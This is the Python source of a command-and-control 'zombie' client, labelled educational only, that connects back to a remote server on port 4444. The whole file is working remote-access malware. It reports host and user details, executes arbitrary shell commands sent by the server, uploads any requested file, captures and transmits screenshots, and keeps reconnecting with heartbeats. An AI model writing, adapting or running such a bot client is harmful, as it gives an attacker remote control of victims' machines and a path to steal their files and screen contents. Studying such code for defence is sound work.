#!/usr/bin/env python3
"""
C2 CLIENT - Simple Zombie Client
Connects to C2 server and executes commands
Educational purposes only
"""

import socket
import threading
import json
import time
import subprocess
import os
import platform
import sys
import base64

try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

class C2Client:
    def __init__(self, server_host, server_port=4444):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = self.generate_id()
        self.socket = None
        self.running = True
        
        # Client info
        self.info = {
            'id': self.client_id,
            'hostname': socket.gethostname(),
            'os': platform.system(),
            'platform': platform.platform(),
            'username': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'Unknown'),
            'python_version': platform.python_version(),
            'screenshot': PIL_AVAILABLE
        }
    
    def generate_id(self):
        """Generate unique client ID"""
        import hashlib
        import uuid
        system_info = f"{platform.node()}{platform.processor()}{os.getpid()}"
        return hashlib.md5(system_info.encode()).hexdigest()[:8]
    
    def print_banner(self):
        """Print client banner"""
        banner = f"""
╔═══════════════════════════════════════════╗
║        C2 CLIENT                          ║
║     ID: {self.client_id}                          ║
║     Server: {self.server_host}:{self.server_port}           ║
╚═══════════════════════════════════════════╝
        """
        print(banner)
    
    def connect(self):
        """Connect to C2 server"""
        self.print_banner()
        
        while self.running:
            try:
                print(f"[*] Connecting to {self.server_host}:{self.server_port}...")
                
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                self.socket.connect((self.server_host, self.server_port))
                
                # Send client info
                self.send_data(self.info)
                
                # Receive acknowledgment
                ack = self.recv_data()
                if ack and ack.get('status') == 'connected':
                    print(f"[+] Connected to server: {ack.get('message')}")
                    return True
                else:
                    print("[-] Invalid server response")
                    self.socket.close()
                    time.sleep(5)
            
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                time.sleep(5)  # Wait before retry
        
        return False
    
    def start(self):
        """Start the client"""
        if not self.connect():
            return
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Main command loop
        while self.running:
            try:
                # Check for commands from server
                data = self.recv_data(timeout=1)
                if data:
                    self.process_command(data)
                
            except socket.timeout:
                continue
            except ConnectionError:
                print("[-] Connection lost, reconnecting...")
                self.reconnect()
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(1)
    
    def reconnect(self):
        """Reconnect to server"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        time.sleep(5)
        self.connect()
    
    def heartbeat_loop(self):
        """Send periodic heartbeats"""
        while self.running:
            try:
                heartbeat = {'type': 'heartbeat', 'timestamp': time.time()}
                self.send_data(heartbeat)
                time.sleep(30)  # Send every 30 seconds
            except:
                time.sleep(5)
    
    def process_command(self, command: dict):
        """Process command from server"""
        cmd_type = command.get('type')
        
        if cmd_type == 'command':
            # Execute shell command
            cmd = command.get('command')
            print(f"[*] Executing command: {cmd}")
            
            output = self.execute_command(cmd)
            result = {
                'type': 'result',
                'command': cmd,
                'output': output,
                'timestamp': time.time()
            }
            self.send_data(result)
        
        elif cmd_type == 'download':
            # Upload file to server
            filepath = command.get('filepath')
            self.upload_file(filepath)
        
        elif cmd_type == 'screenshot':
            # Take screenshot
            self.take_screenshot()
        
        elif cmd_type == 'kill':
            # Kill client
            print("[*] Received kill command, shutting down...")
            self.running = False
            if self.socket:
                self.socket.close()
            sys.exit(0)
    
    def execute_command(self, command: str) -> str:
        """Execute shell command and return output"""
        try:
            if command.startswith('cd '):
                # Handle cd command
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed directory to: {os.getcwd()}"
            else:
                # Execute shell command
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return result.stdout + result.stderr
        
        except subprocess.TimeoutExpired:
            return "Command timed out after 30 seconds"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def take_screenshot(self):
        """Take screenshot and send to server"""
        if not PIL_AVAILABLE:
            result = {
                'type': 'result',
                'command': 'screenshot',
                'output': 'Screenshot not available (PIL not installed)',
                'timestamp': time.time()
            }
            self.send_data(result)
            return
        
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            
            # Convert to bytes
            import io
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes = img_bytes.getvalue()
            
            # Send to server
            file_data = {
                'type': 'file',
                'filename': f'screenshot_{int(time.time())}.png',
                'data': base64.b64encode(img_bytes).decode('utf-8'),
                'timestamp': time.time()
            }
            self.send_data(file_data)
        
        except Exception as e:
            result = {
                'type': 'result',
                'command': 'screenshot',
                'output': f'Error: {str(e)}',
                'timestamp': time.time()
            }
            self.send_data(result)
    
    def upload_file(self, filepath: str):
        """Upload file to server"""
        try:
            if not os.path.exists(filepath):
                result = {
                    'type': 'result',
                    'command': f'download {filepath}',
                    'output': f'File not found: {filepath}',
                    'timestamp': time.time()
                }
                self.send_data(result)
                return
            
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            filename = os.path.basename(filepath)
            upload_data = {
                'type': 'file',
                'filename': filename,
                'data': base64.b64encode(file_data).decode('utf-8'),
                'timestamp': time.time()
            }
            self.send_data(upload_data)
        
        except Exception as e:
            result = {
                'type': 'result',
                'command': f'download {filepath}',
                'output': f'Error: {str(e)}',
                'timestamp': time.time()
            }
            self.send_data(result)
    
    def send_data(self, data: dict):
        """Send JSON data to server"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            length = len(json_data).to_bytes(4, 'big')
            self.socket.sendall(length + json_data)
        except:
            raise ConnectionError("Failed to send data")
    
    def recv_data(self, timeout=None):
        """Receive JSON data from server"""
        try:
            if timeout:
                self.socket.settimeout(timeout)
            
            # Read message length
            length_bytes = self.socket.recv(4)
            if not length_bytes:
                return None
            
            length = int.from_bytes(length_bytes, 'big')
            
            # Read message data
            data = b''
            while len(data) < length:
                chunk = self.socket.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            
            return json.loads(data.decode('utf-8'))
        
        except socket.timeout:
            return None
        except:
            raise ConnectionError("Failed to receive data")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 client.py <server_ip>")
        print("Example: python3 client.py 192.168.1.100")
        sys.exit(1)
    
    server_host = sys.argv[1]
    server_port = 4444
    
    client = C2Client(server_host, server_port)
    
    try:
        client.start()
    except KeyboardInterrupt:
        print("\n[*] Client shutting down...")
        client.running = False
        if client.socket:
            client.socket.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()